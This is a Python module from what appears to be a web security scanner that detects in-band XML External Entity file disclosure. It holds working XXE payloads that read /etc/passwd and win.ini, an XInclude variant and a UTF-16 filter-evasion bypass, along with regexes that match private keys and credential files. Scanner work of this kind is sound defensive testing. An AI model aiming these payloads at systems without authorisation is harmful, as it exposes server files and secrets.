"""In-band XML External Entity — local file disclosure. CWE-611, OWASP A05:2021 (WSTG-INPV-07).

The OAST rule (``xxe-oob``) catches *blind* XXE by making the parser fetch a collaborator URL. This
detector catches the **in-band** case the collaborator can't: a parser that resolves an external
reference and reflects its content, so the file we asked for comes straight back in the response.

Three delivery techniques share one oracle (see ``_STRATEGIES``):

* **Classic SYSTEM entity** — ``<!DOCTYPE .. [<!ENTITY x SYSTEM "file:///etc/passwd">]>``.
* **XInclude** — reads a file *without a DOCTYPE* (``<xi:include parse="text" href=.../>``), so it
  still fires when the parser (or a filter) forbids DOCTYPE declarations.
* **UTF-16 encoding bypass** — the classic payload sent as UTF-16 (with BOM) for raw-XML bodies,
  slipping past filters that only match the UTF-8 DOCTYPE/entity byte pattern; the parser
  auto-detects the encoding from the BOM.

It targets only requests that already speak XML — an ``application/xml`` content type, or a body value
that is itself an XML document — so it never sprays XML at JSON/form endpoints. Zero false positives: a
hit is reported only when the response carries a **known sensitive-file signature** (``/etc/passwd``, a
private key, Windows ``win.ini``, a credentials file) — a normal echo of our XML never matches one — and
it must reproduce.
"""

from __future__ import annotations

import re
from collections.abc import Callable
from urllib.parse import urlsplit

import httpx

from dastcore.core.http_client import BudgetExceededError, HttpClient, OutOfScopeError
from dastcore.core.models import Evidence, Finding, HttpRequest, HttpResponse, InjectionPoint
from dastcore.engine.injection_points import extract_injection_points
from dastcore.engine.rule_engine import build_mutated_request

_MAX_POINTS = 24

# Builds an XML payload that references `target` (a file:// URI).
PayloadBuilder = Callable[[str], str]

# The files we try to read out-of-the-parser via an external SYSTEM entity. Unix first, then Windows.
_XXE_TARGETS = ("file:///etc/passwd", "file:///c:/windows/win.ini", "file:///c:/Windows/win.ini")


def _payload(target: str) -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE dcroot [<!ENTITY dcxxe SYSTEM "{target}">]>'
        "<dcroot>&dcxxe;</dcroot>"
    )


def _xinclude_payload(target: str) -> str:
    """Read a file with *no DOCTYPE* via XInclude — fires even when DOCTYPE is forbidden/stripped."""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<dcroot xmlns:xi="http://www.w3.org/2001/XInclude">'
        f'<xi:include parse="text" href="{target}"/></dcroot>'
    )


# Signatures of a genuinely sensitive file — the same bar the LFI prover uses, so a normal reflected
# document is never presented as an exfiltrated file. (pattern, human label.)
_FILE_SIGNATURES: list[tuple[str, str]] = [
    (r"root:.*:0:0:", "/etc/passwd (cuentas del sistema Unix)"),
    (r"-----BEGIN [A-Z ]*PRIVATE KEY-----", "una clave privada"),
    (r"\[(fonts|extensions|mci extensions)\]|for 16-bit app support", "Windows win.ini"),
    (r"(?im)^\s*(DB_PASSWORD|SECRET[_A-Z]*|API[_-]?KEY|PASSWORD|TOKEN)\s*[=:]", "un fichero con credenciales"),
]


def _looks_like_xml(value: object) -> bool:
    return isinstance(value, str) and value.lstrip()[:1] == "<"


def _is_xml_endpoint(request: HttpRequest) -> bool:
    ctype = (request.headers or {}).get("Content-Type") or (request.headers or {}).get("content-type") or ""
    return "xml" in ctype.lower()


def _match_signature(text: str) -> tuple[str, str] | None:
    for pattern, label in _FILE_SIGNATURES:
        m = re.search(pattern, text)
        if m:
            snippet = text[max(0, m.start() - 8) : m.start() + 160]
            return label, " ".join(snippet.split())[:200]
    return None


def _finding(
    point: InjectionPoint,
    request: HttpRequest,
    response: HttpResponse,
    label: str,
    snippet: str,
    technique: str = "SYSTEM entity",
) -> Finding:
    path = urlsplit(request.url).path or "/"
    where = f"{point.location}:{point.name}"
    return Finding(
        id=f"xxe-inband:{request.method}:{path}:{where}",
        rule_id="xxe-inband",
        name="XML External Entity (in-band, lectura de fichero)",
        severity="high",
        cwe="CWE-611",
        owasp="A05:2021",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        family="xxe",
        injection_point=point,
        evidence=[
            Evidence(
                type="response_match",
                data=(
                    f"una referencia externa XML por {technique} ({where}) hizo que el parser leyera "
                    f"{label} y lo devolviera en la respuesta: «{snippet}» — XXE in-band (lectura de "
                    "ficheros del servidor)"
                )[:200],
                confidence="high",
            )
        ],
        request=request,
        response=response,
        remediation=(
            "Desactiva el procesamiento de DTD y de entidades externas en el parser XML "
            "(FEATURE_SECURE_PROCESSING / disallow-doctype-decl; desactiva entidades generales y de parámetro). "
            "Prefiere un parser que rechace documentos con DOCTYPE."
        ),
    )


# Delivery techniques, tried in order per target: (human label, payload builder, byte encoding).
# The UTF-16 encoding bypass only applies to a raw XML body (the ``xml-document`` point) — an
# injected string value can't carry its own charset.
_STRATEGIES: tuple[tuple[str, PayloadBuilder, str | None], ...] = (
    ("SYSTEM entity", _payload, None),
    ("XInclude (sin DOCTYPE)", _xinclude_payload, None),
    ("SYSTEM entity + UTF-16", _payload, "utf-16"),
)


async def xxe_send(
    client: HttpClient, point: InjectionPoint, xml: str, *, encoding: str | None = None
) -> HttpResponse | None:
    """Deliver an XXE document to ``point``: as the raw request body for an XML endpoint (the synthetic
    ``xml-document`` point), or injected as the value of a body/JSON point that parses XML. Session-aware.
    ``encoding`` (e.g. ``"utf-16"``) sends the raw body as those bytes with a matching charset, for the
    encoding-bypass technique. Shared by the detector and the proof-of-impact escalation."""
    try:
        if point.location == "body" and point.name == "xml-document":
            request = point.request_template
            headers = {k: v for k, v in (request.headers or {}).items() if k.lower() != "content-type"}
            charset = encoding if encoding else "utf-8"
            headers["Content-Type"] = f"application/xml; charset={charset}"
            method = request.method if request.method in ("POST", "PUT", "PATCH") else "POST"
            content: str | bytes = xml.encode(encoding) if encoding else xml
            return await client.request(method, request.url, headers=headers, content=content)
        if encoding is not None:
            return None  # an injected string value can't carry a UTF-16 BOM/charset
        req = build_mutated_request(point, xml)
        return await client.request(
            req.method, req.url, params=req.params or None, headers=req.headers or None,
            cookies=req.cookies or None, data=req.data, json=req.json_body,
        )
    except (OutOfScopeError, BudgetExceededError, httpx.HTTPError):
        return None


async def read_file_via_xxe(
    client: HttpClient,
    point: InjectionPoint,
    target: str,
    *,
    builder: PayloadBuilder = _payload,
    encoding: str | None = None,
) -> tuple[str, str] | None:
    """Try to read ``target`` (a ``file://`` URI) through an external-reference payload on ``point``.
    Returns ``(sensitive-file label, snippet)`` when the response reflects a known sensitive-file
    signature, else None. The building block for both detection and impact escalation."""
    resp = await xxe_send(client, point, builder(target), encoding=encoding)
    return _match_signature(resp.text) if resp is not None else None


async def _probe(client: HttpClient, point: InjectionPoint) -> Finding | None:
    """Try each file target × delivery technique on ``point``; report the first sensitive-file hit that
    reproduces. The technique that worked is recorded in the finding's evidence."""
    is_raw_body = point.location == "body" and point.name == "xml-document"
    for target in _XXE_TARGETS:
        for technique, builder, encoding in _STRATEGIES:
            if encoding is not None and not is_raw_body:
                continue  # encoding bypass only applies to a raw XML body
            hit = await read_file_via_xxe(client, point, target, builder=builder, encoding=encoding)
            if hit is None:
                continue
            confirm = await read_file_via_xxe(client, point, target, builder=builder, encoding=encoding)
            if confirm is not None:
                label, snippet = hit
                return _finding(point, point.request_template, HttpResponse(status_code=200), label, snippet, technique)
    return None


async def run_xxe_inband_checks(client: HttpClient, requests: list[HttpRequest]) -> list[Finding]:
    """Send external-entity file-read payloads to XML-speaking requests and report reflected file content."""
    findings: list[Finding] = []
    seen: set[str] = set()
    probed = 0
    for request in requests:
        path = urlsplit(request.url).path or "/"

        # 1) Endpoint declares XML: replace the whole body with the XXE document (raw send).
        if _is_xml_endpoint(request):
            key = f"body:{request.method}:{path}"
            if key not in seen:
                seen.add(key)
                probed += 1
                point = InjectionPoint(location="body", name="xml-document", base_value="", request_template=request)
                found = await _probe(client, point)
                if found is not None:
                    findings.append(found)

        # 2) A body/JSON value that is itself an XML document: inject the XXE document as that value.
        for point in extract_injection_points(request, include_headers=False):
            if point.location not in ("body", "json") or not _looks_like_xml(point.base_value):
                continue
            key = f"{path}:{point.location}:{point.name}"
            if key in seen:
                continue
            seen.add(key)
            probed += 1
            if probed > _MAX_POINTS:
                return findings
            found = await _probe(client, point)
            if found is not None:
                findings.append(found)
        if probed > _MAX_POINTS:
            break
    return findings
